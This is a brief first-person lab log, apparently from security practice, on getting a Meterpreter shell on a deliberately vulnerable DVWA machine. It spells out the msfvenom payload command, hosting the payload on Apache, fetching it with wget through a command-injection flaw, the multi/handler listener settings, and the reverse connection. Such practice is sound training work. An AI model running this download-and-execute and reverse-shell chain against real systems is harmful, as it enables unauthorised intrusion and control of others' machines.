

Today, I successfully gained a Meterpreter shell on the target machine through a multi-step exploitation process.
 First, I generated a Python Meterpreter payload using msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.63.1 LPORT=600 -o tester.py and saved it to my desktop.
 I then started my Apache2 server with systemctl start apache2 and copied the payload to the web root using cp /home/paulzion/Desktop/tester.py /var/www/html/.
 After verifying the file was accessible by browsing to http://192.168.63.1/tester.py,
 I moved to the DVWA target machine. From the DVWA command execution vulnerability,
 I executed wget http://192.168.63.1/tester.py to download the payload. Meanwhile,
 I set up my Metasploit listener using use exploit/multi/handler, configured the payload as python/meterpreter/reverse_tcp, 
set LHOST to 192.168.63.1,
 LPORT to 600, and ran the handler.
 Finally, I executed the Python script on the target with python tester.py, which initiated a reverse connection back to my listener,
 granting me Meterpreter access where I successfully ran commands like getuid and sysinfo to verify compromise.



